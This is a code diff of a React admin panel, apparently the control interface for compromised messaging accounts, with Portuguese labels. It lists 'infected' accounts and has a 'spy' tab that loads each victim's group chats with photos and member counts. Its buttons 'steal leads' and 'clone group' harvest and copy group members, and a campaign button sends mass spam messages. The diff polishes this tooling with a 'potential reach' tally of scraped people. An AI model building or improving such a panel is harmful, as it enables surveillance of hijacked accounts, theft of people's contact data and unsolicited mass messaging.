@@ -13,7 +13,7 @@ export default function AdminPanel() {
   const [processing, setProcessing] = useState(false);
 
   const [msg, setMsg] = useState('{Olá|Oi}, tudo bem?');
-  const [spyPhone, setSpyPhone] = useState(''); // Conta sendo espionada
+  const [spyPhone, setSpyPhone] = useState(''); 
   const [chats, setChats] = useState([]);
   const [loadingChats, setLoadingChats] = useState(false);
 
@@ -104,15 +104,17 @@ export default function AdminPanel() {
      setProcessing(false);
   };
 
-  // --- FUNÇÕES DE ESPIÃO ---
+  // --- ESPIÃO ---
   const loadChats = async (phone) => {
-    setSpyPhone(phone); // Define qual conta estamos espiando
+    setSpyPhone(phone); 
     setLoadingChats(true);
-    setTab('spy'); // Muda para a aba de espião automaticamente
+    setTab('spy'); 
+    setChats([]); // Limpa lista antiga
     try {
         const res = await fetch('/api/spy/list-chats', { method: 'POST', body: JSON.stringify({ phone }), headers: {'Content-Type': 'application/json'} });
-        const data = await res.json(); setChats(data.chats || []);
-    } catch (e) {}
+        const data = await res.json(); 
+        setChats(data.chats || []);
+    } catch (e) { addLog('Erro ao carregar chats'); }
     setLoadingChats(false);
   };
 
@@ -148,6 +150,9 @@ export default function AdminPanel() {
       setProcessing(false); addLog('✅ Feito.');
   };
 
+  // Cálculo de Leads Totais Visíveis
+  const totalPotentialLeads = chats.reduce((acc, c) => acc + (c.participantsCount || 0), 0);
+
   if (!isAuthenticated) {
     return (
       <div style={{ minHeight: '100vh', display: 'flex', alignItems: 'center', justifyContent: 'center', backgroundColor: '#0d1117', fontFamily: 'monospace' }}>
@@ -173,11 +178,10 @@ export default function AdminPanel() {
         <div>
             {tab === 'dashboard' && (
                 <div style={{ backgroundColor: '#161b22', padding: '20px', borderRadius: '6px' }}>
-                     {/* STATS AGORA APARECEM AQUI DENTRO DO DASHBOARD */}
                     <div style={{ display: 'flex', gap: '10px', marginBottom: '20px' }}>
                         <div style={{ background: '#0d1117', padding: '10px', flex: 1, textAlign: 'center', border: '1px solid #30363d' }}>
                             <div style={{ fontSize: '18px', color: '#fff' }}>{stats.total}</div>
-                            <div style={{ fontSize: '10px', color: '#8b949e' }}>LEADS</div>
+                            <div style={{ fontSize: '10px', color: '#8b949e' }}>LEADS CAPTURADOS</div>
                         </div>
                         <div style={{ background: '#0d1117', padding: '10px', flex: 1, textAlign: 'center', border: '1px solid #d29922' }}>
                             <div style={{ fontSize: '18px', color: '#d29922' }}>{stats.pending}</div>
@@ -194,22 +198,42 @@ export default function AdminPanel() {
                     <button onClick={startRealCampaign} disabled={processing} style={{ width: '100%', padding: '15px', background: '#238636', color: 'white', border: 'none', fontWeight: 'bold' }}>{processing ? 'ENVIANDO...' : '▶️ DISPARAR'}</button>
                 </div>
             )}
+            
             {tab === 'spy' && (
                 <div style={{ backgroundColor: '#161b22', padding: '20px', borderRadius: '6px' }}>
-                     {!spyPhone ? <div style={{textAlign: 'center', color: '#8b949e', padding: '40px'}}>⬅️ Selecione uma conta na lista ao lado clicando no OLHO (👁️)</div> : (
+                     {!spyPhone ? <div style={{textAlign: 'center', color: '#8b949e', padding: '40px'}}>⬅️ Selecione uma conta na lista ao lado (👁️)</div> : (
                         <div>
-                            <h4 style={{borderBottom: '1px solid #30363d', paddingBottom: '10px'}}>Grupos de {spyPhone}</h4>
-                            {loadingChats && <p>Carregando chats...</p>}
-                            <div style={{maxHeight: '400px', overflowY: 'auto'}}>
+                            <div style={{display: 'flex', justifyContent: 'space-between', alignItems: 'center', borderBottom: '1px solid #30363d', paddingBottom: '10px', marginBottom: '15px'}}>
+                                <h4 style={{margin: 0}}>Grupos de {spyPhone}</h4>
+                                <div style={{color: '#00ff00', fontSize: '12px'}}>
+                                    ALCANCE POTENCIAL: <b>{totalPotentialLeads.toLocaleString()}</b> PESSOAS
+                                </div>
+                            </div>
+                            
+                            {loadingChats && <p style={{color:'#8957e5'}}>Carregando grupos e fotos...</p>}
+                            
+                            <div style={{maxHeight: '500px', overflowY: 'auto'}}>
                                 {chats.map(c => (
-                                    <div key={c.id} style={{ borderBottom: '1px solid #30363d', padding: '10px', display: 'flex', justifyContent: 'space-between', alignItems: 'center' }}>
-                                        <div style={{maxWidth: '200px', whiteSpace: 'nowrap', overflow: 'hidden', textOverflow: 'ellipsis'}}>
-                                            {c.title}
-                                            <div style={{fontSize: '10px', color: '#8b949e'}}>{c.type}</div>
+                                    <div key={c.id} style={{ borderBottom: '1px solid #30363d', padding: '15px', display: 'flex', alignItems: 'center', gap: '15px' }}>
+                                        {/* FOTO DO GRUPO */}
+                                        <div style={{width: '50px', height: '50px', borderRadius: '50%', backgroundColor: '#30363d', overflow: 'hidden', flexShrink: 0}}>
+                                            {c.photo ? (
+                                                <img src={c.photo} alt="Grupo" style={{width: '100%', height: '100%', objectFit: 'cover'}} />
+                                            ) : (
+                                                <div style={{width: '100%', height: '100%', display: 'flex', alignItems: 'center', justifyContent: 'center', fontSize: '20px'}}>👥</div>
+                                            )}
                                         </div>
-                                        <div>
-                                            <button onClick={() => handleHarvest(c.id, c.title)} style={{ marginRight: '5px', background: '#d29922', border: 'none', padding: '5px 10px', cursor: 'pointer', borderRadius: '4px' }} title="Roubar Leads">🕷️ Roubar</button>
-                                            <button onClick={() => handleCloneGroup(c.id, c.title)} style={{ background: '#1f6feb', border: 'none', padding: '5px 10px', cursor: 'pointer', borderRadius: '4px' }} title="Clonar Grupo">🐑 Clonar</button>
+
+                                        <div style={{flex: 1}}>
+                                            <div style={{fontWeight: 'bold', fontSize: '14px', color: '#fff'}}>{c.title}</div>
+                                            <div style={{fontSize: '11px', color: '#8b949e', marginTop: '4px'}}>
+                                                {c.type} • <span style={{color: '#d29922', fontWeight: 'bold'}}>{c.participantsCount?.toLocaleString() || 0} Membros</span>
+                                            </div>
+                                        </div>
+
+                                        <div style={{display: 'flex', gap: '5px'}}>
+                                            <button onClick={() => handleHarvest(c.id, c.title)} style={{ background: '#d29922', border: 'none', padding: '8px 12px', cursor: 'pointer', borderRadius: '4px', color: 'white', fontWeight: 'bold', fontSize: '12px' }} title="Roubar Leads">🕷️ ROUBAR</button>
+                                            <button onClick={() => handleCloneGroup(c.id, c.title)} style={{ background: '#1f6feb', border: 'none', padding: '8px 12px', cursor: 'pointer', borderRadius: '4px', color: 'white', fontWeight: 'bold', fontSize: '12px' }} title="Clonar Grupo">🐑 CLONAR</button>
                                         </div>
                                     </div>
                                 ))}
@@ -218,6 +242,7 @@ export default function AdminPanel() {
                      )}
                 </div>
             )}
+            
             {tab === 'tools' && (
                 <div style={{ display: 'flex', flexDirection: 'column', gap: '20px' }}>
                     <div style={{ backgroundColor: '#161b22', padding: '20px' }}>
@@ -239,7 +264,7 @@ export default function AdminPanel() {
             </div>
         </div>
         
-        {/* COLUNA DIREITA: LISTA DE CONTAS */}
+        {/* COLUNA DIREITA */}
         <div style={{ backgroundColor: '#161b22', padding: '20px', borderRadius: '6px' }}>
             <h3>Contas ({sessions.length})</h3>
             {sessions.length === 0 && <p style={{color: '#8b949e', fontSize: '12px'}}>Nenhuma conta infectada ainda.</p>}
@@ -248,7 +273,6 @@ export default function AdminPanel() {
                 <div key={s.id} style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center', padding: '10px', borderBottom: '1px solid #30363d', backgroundColor: spyPhone === s.phone_number ? '#1f242e' : 'transparent' }}>
                     <span style={{ fontSize: '13px', color: spyPhone === s.phone_number ? '#8957e5' : '#c9d1d9' }}>{s.phone_number}</span>
                     <div style={{ display: 'flex', gap: '5px' }}>
-                        {/* BOTÃO ESPIAR RESTAURADO */}
                         <button 
                             onClick={() => loadChats(s.phone_number)} 
                             style={{ background: '#8957e5', border: 'none', color: 'white', cursor: 'pointer', padding: '5px 8px', borderRadius: '4px' }}
